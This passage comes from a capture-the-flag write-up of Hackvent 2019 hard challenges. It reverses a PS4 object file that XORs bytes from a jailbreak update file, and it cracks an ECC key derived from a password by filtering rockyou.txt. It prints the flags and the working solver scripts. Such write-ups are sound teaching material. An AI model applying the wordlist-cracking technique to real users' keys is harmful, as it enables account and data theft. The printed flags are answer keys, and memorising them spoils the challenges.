or:

    
    
    input()[0:1]
    

So it’s only looking at the first character input.

#### Guess Based on Prompt

Thinking that the input is likely a single emoji, I took another look at the
prompt:

    
    
     🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩
    

There’s a lock, and Santa’s stuck, what to do, Christmas tree and flag. My
first thought was a chimney, but didn’t find any emoji that worked. I tried
windows, everything from the unicode portal on day 17. Eventually I entered a
key:

    
    
     ./day19
     🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩 
    🔑
    HV19{*<|:-)____\o/____;-D}
    

**Flag:`HV19{*<|:-)____\o/____;-D}`**

## Day 20

### Challenge

![hv19-ball20](https://0xdfimages.gitlab.io/img/hv19-ball20.png) | HV19.20 i want to play a game  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | hard  
Author: |  hardlock   
  
> Santa was spying you on Discord and saw that you want something weird and
> obscure to reverse?
>
> your wish is my command.

I’m given a zip, which contains a strange file:

    
    
    $ unzip HV19-game.zip 
    Archive:  HV19-game.zip
      inflating: game                    
    $ file game 
    game: Intel amd64 COFF object file, no line number info, not stripped, 26 sections, symbol offset=0xb50, 99 symbols
    

[HV19-game.zip](/files/HV19-game.zip)

### Solution

Looking at the strings in the binary, I see this:

    
    
    /mnt/usb0/PS4UPDATE.PUP
    

Immediately I start to think about PS4 updates.

The file opens in Ghidra, but I’ll eventually figure out that the offsets are
wrong, and there’s a few other things not quite right. After spending some
time looking at the code and getting caught up, I took a step back and
surveyed what I had. First, in the `.data` section, there was a buffer of
bytes:

![image-20191219223322525](https://0xdfimages.gitlab.io/img/image-20191219223322525.png)

Just after that, came several strings:

![image-20191219223343391](https://0xdfimages.gitlab.io/img/image-20191219223343391.png)

Next I started looking through the code. While I was doing so, I had up
various examples from the [PS4-SDK GitHub](https://github.com/CTurt/PS4-SDK),
like
[this](https://github.com/CTurt/PS4-SDK/blob/40c54a2b4668da87011f9b46df3e99572105284b/libPS4/source/module.c)
and
[this](https://github.com/CTurt/PS4-SDK/blob/40c54a2b4668da87011f9b46df3e99572105284b/examples/sockets/source/main.c).

First there was some initialization stuff, and `malloc` some buffers:

    
    
      (*(code *)refptr.initKernel)();
      (*(code *)refptr.initLibc)();
      (*(code *)refptr.initNetwork)();
      sock = (**(code **)refptr.sceKernelLoadStartModule)(0x2174,0,0,0,0,0);
      fread = refptr.sceKernelDlsym;
      (*(code *)refptr.sceKernelDlsym)((ulong)sock,0x219d,&local_520);
      (*(code *)fread)((ulong)sock,0x21c6,&local_518);
      fread = refptr.malloc;
      file = (**(code **)refptr.malloc)(0x40);
      uVar3 = (**(code **)fread)(0x10);
      (*local_520)(file);
      (*local_518)(uVar3);
    

Next comes an interesting block:

    
    
      file = (**(code **)refptr.fopen)(0x2234,0x222a);
      j = (**(code **)fread)(0x21);
      (*(code *)refptr.MD5Init)(local_4a0);
      md5update = refptr.MD5Update;
      fread = refptr.fread;
      while( true ) {
        sock = (**(code **)fread)(auStack1072,1,0x400,file);
        if (sock == 0) break;
        (*(code *)md5update)(local_4a0,auStack1072,(ulong)sock);
      }
      md5_out = local_500;
      (*(code *)refptr.MD5Final)(md5_out,local_4a0);
      (**(code **)refptr.fclose)(file);
      md5update = refptr.sprintf;
      i = j;
      do {
        bVar1 = *(byte *)md5_out;
        md5_out = (undefined2 *)((long)md5_out + 1);
        (**(code **)md5update)(i,0x22d7,(ulong)bVar1);
        i = i + 2;
      } while (&socket.len != md5_out);
    

The file opened can’t be what’s actually at 0x2234 or 0x222a, as neither of
those are strings:

![image-20191219223852233](https://0xdfimages.gitlab.io/img/image-20191219223852233.png)

But, based on what I know about `fread` and the strings available to me, I can
guess it’s:

    
    
    fopen('/mnt/usb0/PS4UPDATE.PUP', 'rb')
    

Now it initializes an MD5sum, and reads in 0x400 bytes at a time, passing the
results reach time to `MD5Update`. Once it’s read the entire file, it calls
`MD5Final`.

The result is then looped over, for each byte, passing it to `sprintf`. While
I can’t be sure of the offsets, it would make perfect sense that it’s calling
it with `%02x`, as that would convert each byte from the md5sum into a hex
string.

Next, there’s a `strcmp`:

    
    
      iVar2 = (**(code **)refptr.strcmp)(0x22fe,j);
      if (iVar2 == 0) {
    

The rest of the code doesn’t run unless the new md5 string matches some other
string. That string has to be “f86d4f9d2c049547bd61f942151ffb55” from the data
section. Googling for it also reveals it’s the md5 for [a PS4
Jailbreak](https://lania.co/ps4_505.html) exploit.

Assuming they match, it then starts a loop:

    
    
        j = 0;
        do {
          abStack1248[j] = *(byte *)(j + 0x229b);
          j = j + 1;
        } while (j != 0x1a);
        j = 0x1337;
        file = (**(code **)refptr.fopen)(0x2322,0x2318);
        do {
          (**(code **)refptr.fseek)(file,j,0);
          (**(code **)fread)(local_4c0,0x1a,1,file);
          i = 0;
          do {
            abStack1248[i] = abStack1248[i] ^ local_4c0[i];
            i = i + 1;
          } while (i != 0x1a);
          j = j + 0x1337;
        } while (j != 0x1714908);
        (**(code **)refptr.fclose)(file);
    

It first reads 0x1a (27) bytes from memory. This seems like the 27 byte buffer
at the start of `.data`. Then it sets a counter to 0x1337, and re-opens a
file. I’m going to guess that’s still the exploit file. It seeks counter bytes
into the file, reads 27 bytes, and xors them against the 27 byte array. Then
it increments the counter by 0x1337, and does it again, until the counter is
0x1714908. Then it closes the file.

Finally, there’s a list block:

    
    
        local_501 = 0;
        socket_name = 0x67616c66646e6573;
        socket.len = 0x210;
        server.ip = 0x100007f;
        server.port = (**(code **)refptr.sceNetHtons)(0x539);
        (**(code **)refptr.memset)(local_4e6,0,6);
        sock = (**(code **)refptr.sceNetSocket)(&socket_name,2,1,0);
        (**(code **)refptr.sceNetConnect)((ulong)sock,&socket.len,0x10);
        (**(code **)refptr.sceNetSend)((ulong)sock,abStack1248,0x1a,0);
        (**(code **)refptr.sceNetSocketClose)((ulong)sock);
    

This code opens a connection to localhost:1337 and sends the 27 byte buffer.

I want to see what’s in that buffer. So I download the exploit file, and I
created a file called `key` with the original 27 bytes in it. Then I wrote
some python that would simulate what I saw in the Ghidra decompiled C:

    
    
    #!/usr/bin/env python3
    
    import binascii
    
    
    with open("key", "r") as f:
        key = binascii.unhexlify(f.read().strip())
    
    with open("505Retail.PUP", "rb") as f:
        pup = f.read()
    
    ctr = 0x1337
    while ctr != 0x1714908:
        key = [x ^ y for x, y in zip(key, pup[ctr : ctr + 0x1A])]
        ctr += 0x1337
    print("".join([chr(c) for c in key]))
    

When I run this, it prints the flag:

    
    
    $ python3 solve.py
    HV19{C0nsole_H0mebr3w_FTW}
    

**Flag:`HV19{C0nsole_H0mebr3w_FTW}`**

## Day 21

### Challenge

![hv19-ball21](https://0xdfimages.gitlab.io/img/hv19-ball21.png) | HV19.21   
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO  
![fun](../img/hv-cat-fun.png)FUN  
Level: | hard  
Author: |  hardlock   
  
> Santa has improved since the last Cryptmas and now he uses harder algorithms
> to secure the flag.
>
> This is his public key:
>  
>  
>     X: 0xc58966d17da18c7f019c881e187c608fcb5010ef36fba4a199e7b382a088072f
>     Y: 0xd91b949eaf992c464d3e0d09c45b173b121d53097a9d47c25220c0b4beb943cX
>  
>
> To make sure this is safe, he used the NIST P-256 standard.
>
> But we are lucky and an Elve is our friend. We were able to gather some
> details from our whistleblower:
>
>   * Santa used a password and SHA256 for the private key (d)
>   * His password was leaked 10 years ago
>   * The password is length is the square root of 256
>   * The flag is encrypted with AES256
>   * The key for AES is derived with `pbkdf2_hmac`, salt:
> “TwoHundredFiftySix”, iterations: `256 * 256 * 256`
>

>
> Phew - Santa seems to know his business - or can you still recover this
> flag?
>  
>  
>     Hy97Xwv97vpwGn21finVvZj5pK/BvBjscf6vffm1po0=
>  

### Solution

This challenge is a very straight forward once I understand the elements given
to me. Santa has a password, that was in a breach from 10 years ago. Googling
“2009 password breach” shows me that is the famous rockyou list:

![1576960804094](https://0xdfimages.gitlab.io/img/1576960804094.png)

I also know it’s 16 characters long (“The password is length is the square
root of 256”). `rockyou.txt` comes on Kali, or I could download it from the
internet. I’ll make a custom list using grep to get just the passwords with 16
characters:

    
    
    $ grep -E '^.{16}$' /usr/share/wordlists/rockyou.txt > rockyou16.txt
    

This reduces the number of possible passwords from over 14 million to less
than 120 thousand:

    
    
    $ wc -l rockyou16.txt
    118092 rockyou16.txt
    

There’s two types of encryption in this challenge. There’s a elliptic curve,
where I have the public key, and I know the private key is the sha256 of
password. There’s also this cipher text I’m given that is the flag, encrypted
with AES, where the secret is derived from the password and the pbkdf2 hmac
algorithm, with a given salt and a large number of iterations, which means it
will take a long time (several seconds) to go from the password to the key. So
brute focring the password via the AES decryption isn’t feisable.

But I can take a sha256 quickly and check the ECC to see if the public keys
match. So I’ll write some Python to do that, and print the password:

    
    
    #!/usr/bin/env python3
    
    import hashlib
    from Crypto.PublicKey import ECC
    
    
    pub = ECC.construct(
        curve="p256",
        point_x=0xC58966D17DA18C7F019C881E187C608FCB5010EF36FBA4A199E7B382A088072F,
        point_y=0xD91B949EAF992C464D3E0D09C45B173B121D53097A9D47C25220C0B4BEB943C,
    )
    
    with open("rockyou16.txt", "r") as f:
        passwords = map(str.strip, f.readlines())
    
    
    for password in passwords:
        d = int(hashlib.sha256(password.encode()).hexdigest(), 16)
        priv = ECC.construct(curve="p256", d=d)
        if priv.public_key() == pub:
            print(f"Found Santa's password: {password}")
            break
    

When I run this, it finds the password in less than 10 seconds (in a
relatively underpowered VM):

    
    
    $ time python3 21.py
    Found Santa's password: santacomesatxmas
    
    real    0m9.601s
    user    0m9.411s
    sys     0m0.063s
    

Now, I’ll use that password to calculate the key material for the AES, and
then decrypt:

    
    
    #!/usr/bin/env python3
    
    import hashlib
    from base64 import b64decode
    from Crypto.PublicKey import ECC
    from Crypto.Cipher import AES
    
    
    pub = ECC.construct(
        curve="p256",
        point_x=0xC58966D17DA18C7F019C881E187C608FCB5010EF36FBA4A199E7B382A088072F,
        point_y=0xD91B949EAF992C464D3E0D09C45B173B121D53097A9D47C25220C0B4BEB943C,
    )
    
    with open("rockyou16.txt", "r") as f:
        passwords = map(str.strip, f.readlines())
    
    
    for password in passwords:
        d = int(hashlib.sha256(password.encode()).hexdigest(), 16)
        priv = ECC.construct(curve="p256", d=d)
        if priv.public_key() == pub:
            print(f"Found Santa's password: {password}")
            break
    
    dk = hashlib.pbkdf2_hmac(
        "sha256", password.encode(), b"TwoHundredFiftySix", 256 * 256 * 256
    )
    aes = AES.new(dk, AES.MODE_ECB)
    flag = aes.decrypt(b64decode("Hy97Xwv97vpwGn21finVvZj5pK/BvBjscf6vffm1po0=")).decode()
    print(f"flag: {flag}")
    

This time, it prints the flag after about 30 seconds:

    
    
    $ time python3 21.py 
    Found Santa's password: santacomesatxmas
    flag: HV19{sry_n0_crypt0mat_th1s_year}
    
    real    0m31.763s
    user    0m31.538s
    sys     0m0.080s
    

**Flag: HV19{sry_n0_crypt0mat_th1s_year}**

[](/hackvent2019/hard)

